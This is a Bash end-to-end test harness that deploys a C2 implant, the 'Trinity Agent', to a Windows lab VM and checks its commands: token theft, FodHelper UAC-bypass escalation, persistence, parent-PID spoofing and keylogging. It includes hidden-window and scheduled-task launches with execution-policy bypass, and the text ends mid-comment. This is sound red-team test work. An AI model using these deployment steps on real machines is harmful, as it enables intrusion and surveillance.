#!/usr/bin/env bash
# ========================================== { START OF FILE } ========================================== #
# scripts/e2e-agent-test.sh
#
# End-to-end test harness for the Trinity Agent, driven against a live Windows guest
# over SSH (see the "Win11 Test VM" section of AGENTS.md).
#
# What it does
#   1. logs in, ensures a listener is bound, creates a campaign
#   2. generates a payload through the TeamServer (or builds one locally with a
#      chosen toolchain using the server-issued payload UUID)
#   3. deploys it to the guest and keeps the SSH session alive, because OpenSSH's
#      job object kills Start-Process children when the session closes
#   4. waits for the agent to check in and validates the host-info fields
#   5. exercises every command the agent implements and asserts the stored result
#   6. reports a PASS/FAIL/SKIP summary and exits non-zero on any failure
#
# Covered: checkin + host info + CIG, shell, powershell, RunU (parent-PID spoof),
#          kill by PID, token steal/rev2self, escalate (FodHelper), persistence
#          (WIN_TASK), execute-assembly (NET_ASM), getuid, the keylogger hook plus its
#          harvest sink, chunked reassembly on the server, file upload, file download,
#          and agent exit (KILL) last, because it ends the process.
# Not covered: typed keyboard input — the guest is driven over SSH, so the hook installs
#              but nothing is typed into it; the harvest is asserted on the server side.
#
# Everything is overridable through the environment, e.g.
#   SSH_HOST=win11-user API_URL=http://192.168.122.20:5000 ./scripts/e2e-agent-test.sh
#   PAYLOAD_SOURCE=clang ./scripts/e2e-agent-test.sh     # build locally with Clang/LLD
#
# Requires on the host: curl, ssh, scp, python3, base64, iconv, docker compose.
# Requires on the guest: OpenSSH server and curl.exe (both ship with Windows 11).
# ========================================== { END OF FILE } ========================================== #

set -uo pipefail

# --------------------------------------------------------------------------- config
API_URL="${API_URL:-http://192.168.122.20:5000}"
# Which account the payload runs under. The default is the standard user, because most cases are
# more meaningful there (and the escalate case classifies "needs an admin" honestly). Set
# AGENT_USER=admin to deploy as pi-admin instead: the gate is then *necessary* for
# `escalate: fodhelper -> High integrity`, but not sufficient — FodHelper routes through AppInfo and
# consent.exe, which cannot be serviced without a desktop session (see
# .pi/notes/interactive-sessions.md). Use the admin variant together with a loopback-RDP or
# autologon session, or the case will still classify as Medium.
AGENT_USER="${AGENT_USER:-user}"
# How the payload is started: `ssh` (default) runs it under an SSH session, which is session 0 with
# no desktop; `task` registers a scheduled task that starts the payload in the *console* session,
# which is the only shape in which escalate's AppInfo/consent hand-off can be serviced. `task`
# needs SSH_ADMIN_PASSWORD and deliberately has no silent fallback to ssh: an "admin" run that
# quietly became a session-0 run would make the escalate line in the report wrong.
AGENT_LAUNCH="${AGENT_LAUNCH:-ssh}"
SSH_HOST="${SSH_HOST:-win11-user}"             # ssh alias for the standard user
SSH_ADMIN_HOST="${SSH_ADMIN_HOST:-win11-admin}" # optional, used for cleanup only
C2_HOST="${C2_HOST:-192.168.122.20}"           # address the guest uses to reach the listener
C2_PORT="${C2_PORT:-5069}"
OPERATOR_USER="${OPERATOR_USER:-operator}"
OPERATOR_PASSWORD="${OPERATOR_PASSWORD:-trinity-operator}"
LISTENER_NAME="${LISTENER_NAME:-}"

# server  -> use the payload the TeamServer builds (its configured toolchain)
# gcc     -> build locally with the mingw-x86_64 preset
# clang   -> build locally with the mingw-clang-x86_64 preset
PAYLOAD_SOURCE="${PAYLOAD_SOURCE:-server}"

# 0 = shipped payload shape. 1 = build a traced payload (-DAGENT_TRACE=ON) plus AgentSupervisor.exe
# and launch the agent under the supervisor, so a failure comes with breadcrumbs and an exit code
# (.pi/notes/live-debugging.md, layer 1). Only meaningful with PAYLOAD_SOURCE=gcc|clang.
TRACE_BUILD="${TRACE_BUILD:-0}"
# Dump the guest's agent-*.log / agent-supervisor-*.log when the run exits non-zero.
TRACE_DUMP="${TRACE_DUMP:-1}"

COMPOSE_FILE="${COMPOSE_FILE:-docker-compose.yml}"
PG_USER="${PG_USER:-postgres}"
PG_DB="${PG_DB:-postgres}"

CHECKIN_TIMEOUT="${CHECKIN_TIMEOUT:-180}"   # seconds to wait for the first checkin
TASK_TIMEOUT="${TASK_TIMEOUT:-150}"         # seconds to wait for a task result
# The payload, launcher and markers live in the account's profile, so the admin variant needs
# pi-admin's directory rather than pi-user's.
if [ "$AGENT_USER" = "admin" ]; then
    SSH_HOST="${SSH_ADMIN_HOST}"
    GUEST_DIR="${GUEST_DIR_OVERRIDE:-C:\\Users\\pi-admin}"
else
    GUEST_DIR="${GUEST_DIR:-C:\\Users\\pi-user}"
fi
# The agent dies when its SSH session closes (OpenSSH job object), so the session must
# outlive the whole run; cleanup kills it. Keep this larger than the whole suite.
HOLD_SECONDS="${HOLD_SECONDS:-1800}"
KEEP_ARTIFACTS="${KEEP_ARTIFACTS:-0}"       # 1 = leave payload/logs on the guest

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
RUN_ID="$(date +%s)"
AGENT_NAME="e2e_agent_${RUN_ID}.exe"
SUPERVISOR_NAME="e2e_supervisor_${RUN_ID}.exe"
SUPERVISOR_LOCAL=""
PROBE_NAME=""
LISTENER_NAME="${LISTENER_NAME:-e2e-listener-${RUN_ID}}"
WORK_DIR="$(mktemp -d /tmp/trinity-e2e.XXXXXX)"

# --------------------------------------------------------------------------- output
if [ -t 1 ]; then
    C_RESET=$'\033[0m'; C_GREEN=$'\033[32m'; C_RED=$'\033[31m'; C_YELLOW=$'\033[33m'; C_BLUE=$'\033[36m'
else
    C_RESET=''; C_GREEN=''; C_RED=''; C_YELLOW=''; C_BLUE=''
fi

PASS=0; FAIL=0; SKIP=0
declare -a SUMMARY=()

section() { printf '\n%s== %s ==%s\n' "$C_BLUE" "$1" "$C_RESET"; }
info()    { printf '   %s\n' "$1"; }
ok()   { PASS=$((PASS + 1)); SUMMARY+=("PASS  $1"); printf '   %sPASS%s  %s\n' "$C_GREEN" "$C_RESET" "$1"; }
bad()  { FAIL=$((FAIL + 1)); SUMMARY+=("FAIL  $1"); printf '   %sFAIL%s  %s\n' "$C_RED" "$C_RESET" "$1"; [ -n "${2:-}" ] && printf '         %s\n' "$2"; }
skip() { SKIP=$((SKIP + 1)); SUMMARY+=("SKIP  $1"); printf '   %sSKIP%s  %s%s\n' "$C_YELLOW" "$C_RESET" "$1" "${2:+ ($2)}"; }

die() { printf '\n%sFATAL%s %s\n' "$C_RED" "$C_RESET" "$1" >&2; exit 2; }

# --------------------------------------------------------------------------- helpers
# Default call budget. Payload generation is the exception: the TeamServer compiles the agent
# with CMake + mingw inside the container, so the first generation after an image rebuild is
# minutes, not seconds. Callers raise the budget with `API_TIMEOUT=600 api_post ...`.
api_get() { curl -sS -m "${API_TIMEOUT:-20}" -H "$AUTH" "$API_URL$1"; }
api_post() { curl -sS -m "${API_TIMEOUT:-20}" -X POST -H "$AUTH" -H "Content-Type: application/json" -d "$2" "$API_URL$1"; }
api_code() { curl -s -o /dev/null -w '%{http_code}' -m 10 "$@"; }

psql_q() { # single-line answer, no padding
    # The compose file pins container_name, so `docker exec` works even when the stack was started
    # under a different compose project name (e.g. `-p sleepydev`) than the one this checkout would
    # derive from its directory. Fall back to compose for the normal `up` in the repo root.
    if docker inspect -f '{{.State.Running}}' trinity-postgres 2>/dev/null | grep -q true; then
        docker exec -i trinity-postgres \
            psql -U "$PG_USER" -d "$PG_DB" -t -A -F '|' -c "$1" 2>/dev/null | tr -d '\r'
    else
        docker compose -f "$REPO_ROOT/$COMPOSE_FILE" exec -T postgres \
            psql -U "$PG_USER" -d "$PG_DB" -t -A -F '|' -c "$1" 2>/dev/null | tr -d '\r'
    fi
}

ts_exec() { # run a command inside the TeamServer container
    # Same reason as psql_q: the compose file pins container_name, so `docker exec` works when
    # the stack was started under a different compose project name than this checkout derives.
    if docker inspect -f '{{.State.Running}}' trinity-teamserver 2>/dev/null | grep -q true; then
        docker exec -i trinity-teamserver "$@"
    else
        docker compose -f "$REPO_ROOT/$COMPOSE_FILE" exec -T teamserver "$@"
    fi
}

ssh_run() { ssh -o BatchMode=yes -o ConnectTimeout=10 -o LogLevel=ERROR "$SSH_HOST" "$@"; }

# Run a PowerShell script on the guest. The script is base64/UTF-16LE encoded so that
# no quoting or escaping survives the trip through ssh -> cmd -> powershell.
ps_run() {
    local script b64
    script="$(cat)"
    b64="$(printf '%s' "$script" | iconv -f UTF-8 -t UTF-16LE | base64 -w0)"
    ssh -o BatchMode=yes -o ConnectTimeout=10 -o LogLevel=ERROR "$SSH_HOST" \
        "powershell -NoProfile -NonInteractive -EncodedCommand $b64"
}

# Same as ps_run, but on the admin account (needed to change Defender settings).
ps_run_admin() {
    local script b64
    script="$(cat)"
    b64="$(printf '%s' "$script" | iconv -f UTF-8 -t UTF-16LE | base64 -w0)"
    ssh -o BatchMode=yes -o ConnectTimeout=10 -o LogLevel=ERROR "$SSH_ADMIN_HOST" \
        "powershell -NoProfile -NonInteractive -EncodedCommand $b64"
}

# guest_exists <windows-path> - Test-Path without cmd.exe quoting traps.
guest_exists() {
    ps_run <<PS 2>/dev/null | tr -d '\r' | grep -qi '^true$'
Test-Path -LiteralPath "$1"
PS
}

json_str() { python3 -c 'import json,sys; print(json.dumps(sys.argv[1]))' "$1"; }

# fetch_trace <label> - show the trace/supervisor logs a traced payload wrote to the guest's %TEMP%.
# Only TRACE_BUILD=1 payloads write them; absence is reported, never treated as a failure.
fetch_trace() {
    local label="${1:-failure}" found
    found="$(ps_run <<PS 2>/dev/null | tr -d '\r' | head -1
\$logs = Get-ChildItem -Path \$env:TEMP -Filter 'agent-*.log' -ErrorAction SilentlyContinue
if (\$logs) { 'yes' } else { 'none' }
PS
)"
    if [ "$found" != "yes" ]; then
        info "trace: no agent-*.log in guest %TEMP% ($label; TRACE_BUILD=1 builds one)"
        print_debug_workflow "$label"
        return 0
    fi
    info "trace ($label):"
    ps_run <<PS 2>/dev/null | tr -d '\r' | sed 's/^/      /'
Get-ChildItem -Path \$env:TEMP -Filter 'agent-*.log' -ErrorAction SilentlyContinue |
    Sort-Object LastWriteTime |
    ForEach-Object {
        '--- ' + \$_.Name + ' (' + \$_.LastWriteTime.ToString('HH:mm:ss') + ') ---'
        Get-Content -LiteralPath \$_.FullName -Tail 40
    }
PS
}

# print_debug_workflow <label> - Layer 2 (text debugger) for the payload that was built.
#
# A trace log answers "which stage", not "which instruction". When TRACE_BUILD=1 still leaves the
# cause open, the next step is a batch debugger on the guest: cdb for a clang/MSVC build (PDB must
# be named Agent.pdb) and gdb for a GCC/DWARF build. Printing the exact command at the failure is
# the difference between a red line and a stack.
print_debug_workflow() {
    local label="${1:-failure}"
    case "${PRESET:-}" in
        mingw-clang-x86_64)
            info "debug ($label): clang/PDB build -> on the guest, in the payload's directory:"
            info "      cdb -cf script.cmds -o Agent.exe        (script.cmds: .sympath .; .reload; g; kp; q)"
            info "      dumps: cdb -z %TEMP%\\agent-<pid>.dmp -c \"!analyze -v; ~*kn; q\""
            ;;
        mingw-x86_64)
            info "debug ($label): GCC/DWARF build -> on the guest, in the payload's directory:"
            info "      gdb -batch -q -x run.gdb Agent.exe      (run.gdb: set pagination off; handle SIGSEGV stop print; run; bt full; q)"
            ;;
        *)
            info "debug ($label): payload came from the TeamServer's own build; re-run with"
            info "      TRACE_BUILD=1 PAYLOAD_SOURCE=clang ./scripts/e2e-agent-test.sh"
            info "      to get a trace log and the cdb/gdb command above."
            ;;
    esac
    info "note: a kill by the OpenSSH job object produces no dump, so a missing dump is not a clean exit."
}

# Wait for a queued task to reach a terminal state. Prints "status|result".
wait_task() {
    local id="$1" deadline=$((SECONDS + TASK_TIMEOUT)) line status
    while [ "$SECONDS" -lt "$deadline" ]; do
        line="$(psql_q "select t.\"Status\", coalesce(replace(r.\"Result\", chr(10), ' '), '')
                        from \"Tasks\" t left join \"TaskResult\" r on r.\"TaskID\" = t.\"ID\"
                        where t.\"ID\" = $id;")"
        status="${line%%|*}"
        case "$status" in
            success|error|failure) printf '%s\n' "$line"; return 0 ;;
        esac
        sleep 3
    done
    printf 'timeout|\n'
}

# run_test <label> <queue-endpoint> <json-body> <expected-substring> [skip-regex]
run_test() {
    local label="$1" endpoint="$2" body="$3" expect="$4" skip_re="$5"
    local resp task_id out status result
    resp="$(api_post "$endpoint" "$body")"
    task_id="$(printf '%s' "$resp" | python3 -c 'import json,sys
try: print(json.load(sys.stdin).get("taskID", 0))
except Exception: print(0)')"
    if [ "$task_id" = "0" ]; then
        bad "$label" "queueing failed: $resp"
        return
    fi

    out="$(wait_task "$task_id")"
    status="${out%%|*}"
    result="${out#*|}"

    if [ -n "$skip_re" ] && printf '%s' "$result" | grep -Eq "$skip_re"; then
        skip "$label" "environment: $result"
        return
    fi
    if [ "$status" != "success" ]; then
        bad "$label" "status=$status result=$result error=$(task_error "$task_id")"
        return
    fi
    if [ -n "$expect" ] && ! printf '%s' "$result" | grep -Fqi -- "$expect"; then
        bad "$label" "expected '$expect' in: $result"
        return
    fi
    ok "$label"
}

# queue_raw_task <taskType> <taskCode> <command-json> - inserts a task row directly.
# The API validators reject malformed commands, so this is the only way to reproduce what a
# buggy server-side writer produces (e.g. a command rewrite that drops TransferID).
# queue_raw_task <taskType> <taskCode> <command-json> - inserts a task row directly.
# The API validators reject malformed commands, so this is the only way to reproduce what a
# buggy server-side writer produces (e.g. a command rewrite that drops TransferID).
# psql also echoes the command tag ("INSERT 0 1") for a RETURNING insert, so keep only the id.
queue_raw_task() {
    psql_q "insert into \"Tasks\" (\"AgentID\",\"CommandType\",\"Code\",\"Command\",\"Status\",\"CreatedAt\")
            values ($AGENT_ID, '$1'::\"taskType\", '$2'::\"taskCode\", '$3'::jsonb, 'queued', now())
            returning \"ID\";" | head -1 | tr -d '[:space:]'
}

# task_error <task-id> - the agent's error message for a task that failed, or empty.
task_error() {
    psql_q "select \"Message\" from \"Errors\" where \"TaskID\" = $1;"
}

# expect_missing_field <label> <taskType> <taskCode> <command-json> <field>
# Asserts the agent rejected the command with Status=ERROR and named the missing wire key.
expect_missing_field() {
    local label="$1" type="$2" code="$3" command="$4" field="$5" id out status message
    id="$(queue_raw_task "$type" "$code" "$command")"
    if ! printf '%s' "$id" | grep -qE '^[0-9]+$'; then
        bad "$label" "could not queue the task: ${id:-<no id>}"
        return
    fi
    out="$(wait_task "$id")"; status="${out%%|*}"
    message="$(task_error "$id")"
    if [ "$status" = "timeout" ]; then
        bad "$label" "task $id never reported a result"
    elif [ "$status" != "error" ]; then
        bad "$label" "task $id reported status=$status, expected error"
    elif ! printf '%s' "$message" | grep -Fq -- "$field"; then
        bad "$label" "error message does not name '$field': ${message:-<no error row>}"
    else
        ok "$label"
    fi
}

agent_field() { # agentID field
    api_get "/api/v1/agents" | python3 -c '
import json,sys
field, pid = sys.argv[1], sys.argv[2]
try: agents = json.load(sys.stdin)
except Exception: agents = []
for a in agents if isinstance(agents, list) else []:
    if str(a.get("agentID")) == pid:
        print(a.get(field, "")); break
' "$2" "$1"
}

find_agent() { # by process name -> agentID or empty
    api_get "/api/v1/agents" | python3 -c '
import json,sys
name = sys.argv[1].lower()
try: agents = json.load(sys.stdin)
except Exception: agents = []
for a in agents if isinstance(agents, list) else []:
    if str(a.get("processName", "")).lower() == name:
        print(a.get("agentID")); break
' "$1"
}

# --------------------------------------------------------------------------- cleanup
LAUNCHER_PID=""
cleanup() {
    local rc=$?
    if [ -n "$LAUNCHER_PID" ] && kill -0 "$LAUNCHER_PID" 2>/dev/null; then
        kill "$LAUNCHER_PID" 2>/dev/null
    fi
    # A failed run is exactly when the trace carries the answer: fetch it before the session (and
    # the agent with it) goes away.
    if [ "$rc" -ne 0 ] && [ "$TRACE_DUMP" = "1" ]; then
        fetch_trace "exit $rc"
    fi
    # A task-launched payload is not tied to the SSH session: stop and delete the task too, or the
    # next run starts two agents and the guest keeps one after the gate says it cleaned up.
    if [ -n "${TASK_NAME:-}" ]; then
        ps_run_admin <<PS >/dev/null 2>&1
schtasks /end /tn "$TASK_NAME" | Out-Null
schtasks /delete /tn "$TASK_NAME" /f | Out-Null
PS
    fi
    # OpenSSH keeps the child alive only while the session lives; taskkill is a backstop.
    if [ -n "${AGENT_ID:-}" ]; then
        ssh -o BatchMode=yes -o ConnectTimeout=8 -o LogLevel=ERROR "$SSH_ADMIN_HOST" \
            "cmd /c taskkill /F /IM $AGENT_NAME" >/dev/null 2>&1 || true
    fi
    if [ "$KEEP_ARTIFACTS" != "1" ] && [ -n "${AGENT_NAME:-}" ]; then
        ssh -o BatchMode=yes -o ConnectTimeout=8 -o LogLevel=ERROR "$SSH_HOST" \
            "cmd /c del /f /q %USERPROFILE%\\$AGENT_NAME %USERPROFILE%\\${AGENT_NAME}.err %USERPROFILE%\\${AGENT_NAME}.out %USERPROFILE%\\${AGENT_NAME}.ps1 %USERPROFILE%\\$PROBE_NAME %USERPROFILE%\\$SUPERVISOR_NAME %USERPROFILE%\\netasm_* %USERPROFILE%\\e2e_persist_* %TEMP%\\agent-*.log" \
            >/dev/null 2>&1 || true
    fi
    rm -rf "$WORK_DIR"
    exit "$rc"
}
trap cleanup EXIT INT TERM

# --------------------------------------------------------------------------- preflight
section "preflight"

for bin in curl ssh scp python3 base64 iconv; do
    command -v "$bin" >/dev/null 2>&1 || die "missing required tool: $bin"
done

info "API:      $API_URL"
info "guest:    $SSH_HOST"
info "listener: http://$C2_HOST:$C2_PORT"
info "payload:  $PAYLOAD_SOURCE"
info "agent as: $AGENT_USER ($SSH_HOST), launch: $AGENT_LAUNCH"
info "run id:   $RUN_ID"

api_code "$API_URL/api/v1/server/status" | grep -q 200 || die "TeamServer not reachable at $API_URL"

ssh_run 'cmd /c echo ssh-ok' 2>/dev/null | grep -q "ssh-ok" || die "cannot ssh to $SSH_HOST"

ok "preflight: API and SSH reachable"

psql_q 'select 1' >/dev/null 2>&1 || die "cannot query postgres (task results are only stored in the DB)"

# --------------------------------------------------------------------------- auth
section "authentication"
LOGIN="$(curl -sS -m 20 -X POST "$API_URL/api/v1/auth/login" -H 'Content-Type: application/json' \
    -d "$(python3 -c 'import json,sys; print(json.dumps({"Username": sys.argv[1], "Password": sys.argv[2]}))' \
        "$OPERATOR_USER" "$OPERATOR_PASSWORD")")"
TOKEN="$(printf '%s' "$LOGIN" | python3 -c 'import json,sys
try: print(json.load(sys.stdin).get("token", ""))
except Exception: print("")')"
[ -n "$TOKEN" ] || die "login failed: $LOGIN"
AUTH="Authorization: Bearer $TOKEN"
ok "login as $OPERATOR_USER"

# --- authorization + controller activation ------------------------------------
# A controller whose interface is unregistered authenticates fine (401 anonymous is correct) and
# then fails to activate, which the global handler turns into a bare 400. Every case below this
# point used a route that happened to be registered, so the suite was green with three controllers
# dead. Assert both halves: 401 without a token, 200 with one.
section "authorization"
for route in /api/v1/operators /api/v1/admins /api/v1/files /api/v1/campaigns /api/v1/payloads /api/v1/tasks/tasks; do
    label="$(printf '%s' "$route" | sed 's#.*/##')"
    ANON_CODE="$(api_code "$API_URL$route")"
    AUTH_CODE="$(api_code -H "$AUTH" "$API_URL$route")"
    if [ "$ANON_CODE" != "401" ]; then
        bad "authorization: $label anonymous is 401" "got $ANON_CODE"
    elif [ "$AUTH_CODE" != "200" ]; then
        bad "authorization: $label authorized is 200" "got $AUTH_CODE (controller activation failed)"
    else
        ok "authorization: $label anonymous 401 / authorized 200"
    fi
done

# --------------------------------------------------------------------------- listener
section "listener"
# Listeners live in memory, and every listener this harness creates is named
# "e2e-listener-<run id>". Leftovers from earlier runs keep the port bound, which turned the
# create case into a permanent skip after the first run. Remove our own leftovers first and
# never touch a listener this harness did not name.
for stale in $(api_get /api/v1/listeners | python3 -c '
import json,sys
try: items = json.load(sys.stdin)
except Exception: items = []
print(" ".join(str(l.get("id")) for l in items
               if str(l.get("name", "")).startswith("e2e-listener-")))'); do
    api_code -X DELETE -H "$AUTH" "$API_URL/api/v1/listeners/$stale" >/dev/null
    info "removed stale listener $stale from a previous run"
done

LISTENER_RESP="$(api_post "/api/v1/listeners/http" "$(python3 -c '
import json,sys
print(json.dumps({"name": sys.argv[1], "config": {
    "bindPort": int(sys.argv[2]), "c2Port": int(sys.argv[2]),
    "userAgent": "Trinity Agent Client/1.0",
    "header": "Content-Type: application/json",
    "hosts": [sys.argv[3]], "rotationStrategy": "Random", "maxRetryStrategy": "Linear"}}))' \
    "$LISTENER_NAME" "$C2_PORT" "$C2_HOST")")"

LISTENER_ID="$(printf '%s' "$LISTENER_RESP" | python3 -c 'import json,sys
try: print(json.load(sys.stdin).get("listenerID", 0))
except Exception: print(0)')"

# A successful create returns an empty body (only errors carry JSON), so resolve the id
# from the list endpoint by name.
if [ -z "$LISTENER_ID" ] || [ "$LISTENER_ID" = "0" ]; then
    LISTENER_ID="$(api_get /api/v1/listeners | python3 -c '
import json,sys
name = sys.argv[1]
try: items = json.load(sys.stdin)
except Exception: items = []
items = items if isinstance(items, list) else []
match = next((l["id"] for l in items if str(l.get("name")) == name), 0)
print(match if match else (items[-1]["id"] if items else 0))' "$LISTENER_NAME")"

    [ -n "$LISTENER_ID" ] && [ "$LISTENER_ID" != "0" ] \
        || die "listener creation failed: ${LISTENER_RESP:-<empty response>}"

    if printf '%s' "$LISTENER_RESP" | grep -qi "occupied"; then
        # Listeners live only in memory, so an existing bound port is fine.
        skip "create listener" "port $C2_PORT already bound; reusing listener $LISTENER_ID"
    else
        ok "listener ready (id=$LISTENER_ID)"
    fi
else
    ok "listener created (id=$LISTENER_ID)"
fi

# Listeners are created after the preflight checks and live only in memory, so the
# guest-reachability probe has to run here, once a listener is actually bound.
GUEST_C2=""
for _ in 1 2 3 4 5; do
    GUEST_C2="$(ssh_run "cmd /c curl -s -m 5 -o NUL -w \"%{http_code}\" http://$C2_HOST:$C2_PORT/" 2>/dev/null | tr -d '\r')"
    [ "$GUEST_C2" = "200" ] && break
    sleep 2
done
[ "$GUEST_C2" = "200" ] || die "guest cannot reach the listener at http://$C2_HOST:$C2_PORT (http=$GUEST_C2)"
ok "guest can reach the C2 listener"

# --------------------------------------------------------------------------- campaign
section "campaign + payload"
CAMPAIGN_NAME="e2e-${RUN_ID}"
api_post "/api/v1/campaigns" "$(python3 -c 'import json,sys; print(json.dumps({"Name": sys.argv[1]}))' "$CAMPAIGN_NAME")" >/dev/null

CAMPAIGN_ID="$(api_get "/api/v1/campaigns" | python3 -c '
import json,sys
name = sys.argv[1]
try: items = json.load(sys.stdin)
except Exception: items = []
print(next((c["id"] for c in items if c.get("name") == name), 0))' "$CAMPAIGN_NAME")"
[ "$CAMPAIGN_ID" != "0" ] || die "could not resolve campaign id for $CAMPAIGN_NAME"
ok "campaign $CAMPAIGN_NAME (id=$CAMPAIGN_ID)"

GEN_RESP="$(API_TIMEOUT="${PAYLOAD_BUILD_TIMEOUT:-600}" api_post "/api/v1/payloads/generate" "$(python3 -c '
import json,sys
print(json.dumps({"Name": sys.argv[1], "ListenerID": int(sys.argv[2]), "CampaignID": int(sys.argv[3]),
                  "Architecture": "x64", "Type": "winexe", "OutputFormat": "exe",
                  "RetryStrategy": "", "isStageless": True}))' \
    "e2e-$RUN_ID" "$LISTENER_ID" "$CAMPAIGN_ID")")"

PAYLOAD_ID="$(printf '%s' "$GEN_RESP" | python3 -c 'import json,sys
try: print(json.load(sys.stdin).get("id", 0))
except Exception: print(0)')"
[ "$PAYLOAD_ID" != "0" ] || die "payload generation failed: $GEN_RESP"
ok "payload generated (id=$PAYLOAD_ID)"

AGENT_BIN="$WORK_DIR/$AGENT_NAME"
if [ "$PAYLOAD_SOURCE" = "server" ]; then
    curl -sS -m 120 -H "$AUTH" -o "$AGENT_BIN" "$API_URL/api/v1/payloads/$PAYLOAD_ID" || die "payload download failed"
    ok "downloaded server-built payload"
else
    case "$PAYLOAD_SOURCE" in
        gcc)   PRESET=mingw-x86_64 ;;
        clang) PRESET=mingw-clang-x86_64 ;;
        *) die "PAYLOAD_SOURCE must be server, gcc or clang" ;;
    esac
    UUID="$(psql_q "select \"PayloadUUID\" from \"Payloads\" where \"ID\" = $PAYLOAD_ID;")"
    [ -n "$UUID" ] || die "could not read payload UUID for id=$PAYLOAD_ID"
    info "building locally with $PRESET (uuid=$UUID)"
    # TRACE_BUILD turns on the trace logger and the exit-code supervisor (layer 1 of
    # .pi/notes/live-debugging.md); the shipped shape stays off.
    TRACE_ARGS=""
    [ "$TRACE_BUILD" = "1" ] && TRACE_ARGS="-DAGENT_TRACE=ON -DAGENT_SUPERVISOR=ON"
    cmake -S "$REPO_ROOT/Agent" -B "$WORK_DIR/build" --preset "$PRESET" \
        -DINPUT_HOSTS="$C2_HOST" -DINPUT_PAYLOAD_UUID="$UUID" -DPORT="$C2_PORT" \
        -DINPUT_USER_AGENT="Trinity Agent Client/1.0" \
        -DINPUT_REQUEST_HEADER="Content-Type: application/json" $TRACE_ARGS >"$WORK_DIR/cmake.log" 2>&1 \
        || { tail -20 "$WORK_DIR/cmake.log"; die "cmake configure failed"; }
    cmake --build "$WORK_DIR/build" --config Release >>"$WORK_DIR/cmake.log" 2>&1 \
        || { tail -30 "$WORK_DIR/cmake.log"; die "build failed"; }
    cp "$WORK_DIR/build/Agent.exe" "$AGENT_BIN" || die "missing build output"
    ok "built payload locally with $PRESET"
    if [ "$TRACE_BUILD" = "1" ]; then
        SUPERVISOR_LOCAL="$WORK_DIR/build/AgentSupervisor.exe"
        [ -s "$SUPERVISOR_LOCAL" ] || die "TRACE_BUILD=1 but AgentSupervisor.exe was not built"
        ok "built AgentSupervisor.exe (traced payload)"
    fi
fi

[ -s "$AGENT_BIN" ] || die "payload binary is empty"
info "payload size: $(stat -c%s "$AGENT_BIN") bytes"
if [ "$TRACE_BUILD" = "1" ] && [ "$PAYLOAD_SOURCE" = "server" ]; then
    info "TRACE_BUILD=1 needs PAYLOAD_SOURCE=clang|gcc: the server builds Release without AGENT_TRACE"
fi

# --------------------------------------------------------------------------- deploy
section "deploy"

scp -o BatchMode=yes -o ConnectTimeout=10 -o LogLevel=ERROR "$AGENT_BIN" "$SSH_HOST:$AGENT_NAME" \
    || die "scp failed"

deployed=0
for _ in 1 2 3 4 5; do
    sleep 2
    if guest_exists "$GUEST_DIR\\$AGENT_NAME"; then deployed=1; break; fi
done
[ "$deployed" = "1" ] || die "payload missing on the guest after scp (Defender quarantine?)"
ok "payload copied to the guest"

if [ -n "$SUPERVISOR_LOCAL" ]; then
    scp -o BatchMode=yes -o ConnectTimeout=10 -o LogLevel=ERROR "$SUPERVISOR_LOCAL" "$SSH_HOST:$SUPERVISOR_NAME" \
        || die "scp of AgentSupervisor.exe failed"
    ok "supervisor copied to the guest (exit codes go to %TEMP%\\agent-supervisor-*.log)"
fi

# Empty unless the payload runs under the supervisor (TRACE_BUILD=1).
SUPERVISOR_GUEST=""
[ -n "$SUPERVISOR_LOCAL" ] && SUPERVISOR_GUEST="$SUPERVISOR_NAME"

# Stale traces from an earlier run would be indistinguishable from this one's in the failure dump.
if [ "$TRACE_BUILD" = "1" ]; then
    ps_run <<'PS' >/dev/null 2>&1
Get-ChildItem -Path $env:TEMP -Filter 'agent-*.log' | Remove-Item -Force -ErrorAction SilentlyContinue
PS
fi

if [ "$AGENT_LAUNCH" = "task" ]; then
    # An interactive-token principal (/it) takes no password, so SSH_ADMIN_PASSWORD is optional and
    # /rp must NOT be passed: on this guest `/it` + `/rp` registers a task that `/run` then refuses
    # with "Element not found" (0x80070490). Verified 2026-11-09; use /it alone.

    TASK_NAME="TrinityE2E_${RUN_ID}"
    cat >"$WORK_DIR/$AGENT_NAME.ps1" <<PS1
\$ErrorActionPreference = "Continue"
\$exe = Join-Path \$env:USERPROFILE "$AGENT_NAME"
\$log = Join-Path \$env:USERPROFILE "$AGENT_NAME.log"
Remove-Item \$log -ErrorAction SilentlyContinue
# Runs inside the console session, so the helper is in the same session as the agent — RunU and the
# token tests open a process the agent can actually reach.
\$helper = Start-Process -FilePath "\$env:SystemRoot\System32\cmd.exe" -ArgumentList "/c timeout /t $HOLD_SECONDS /nobreak" -PassThru -WindowStyle Hidden
\$p = Start-Process -FilePath \$exe -PassThru -WindowStyle Hidden
\$sid = (Get-Process -Id \$p.Id).SessionId
("helper pid=" + \$helper.Id + " started pid=" + \$p.Id + " session=" + \$sid) |
    Out-File -FilePath \$log -Encoding utf8
Start-Sleep -Seconds $HOLD_SECONDS
PS1
    scp -o BatchMode=yes -o ConnectTimeout=10 -o LogLevel=ERROR "$WORK_DIR/$AGENT_NAME.ps1" "$SSH_HOST:$AGENT_NAME.ps1" \
        || die "scp of the task launcher failed"

    INTERACTIVE_USER="${INTERACTIVE_USER:-$AGENT_USER}"
    case "$INTERACTIVE_USER" in
        admin) TASK_USER="pi-admin" ;;
        user)  TASK_USER="pi-user" ;;
        *)     TASK_USER="$INTERACTIVE_USER" ;;
    esac

    # Register + start, then read the log the launcher writes (session id included: session 1 is the
    # console, session 0 is why escalate cannot be serviced).
    ps_run_admin <<PS 2>&1 | tee -a "$WORK_DIR/launch.log"
schtasks /create /tn "$TASK_NAME" /tr "powershell -NoProfile -ExecutionPolicy Bypass -File %USERPROFILE%\\$AGENT_NAME.ps1" /sc once /st 00:00 /ru "$TASK_USER" /it /f
schtasks /run /tn "$TASK_NAME"
PS

    LAUNCH_LOG=""
    for _ in 1 2 3 4 5 6 7 8 9 10; do
        sleep 2
        LAUNCH_LOG="$(ps_run_admin <<PS 2>/dev/null | tr -d '\r' | head -1
if (Test-Path -LiteralPath "$GUEST_DIR\\$AGENT_NAME.log") { Get-Content -LiteralPath "$GUEST_DIR\\$AGENT_NAME.log" | Select-Object -First 1 }
PS
)"
        [ -n "$LAUNCH_LOG" ] && break
    done
    printf '%s\n' "$LAUNCH_LOG" >>"$WORK_DIR/launch.log"
    grep -q "started pid=" "$WORK_DIR/launch.log" || { cat "$WORK_DIR/launch.log"; die "the scheduled task did not start the payload (schtasks output above)"; }
    # The whole point of this mode: session 1 is the console. Session 0 means the principal was not
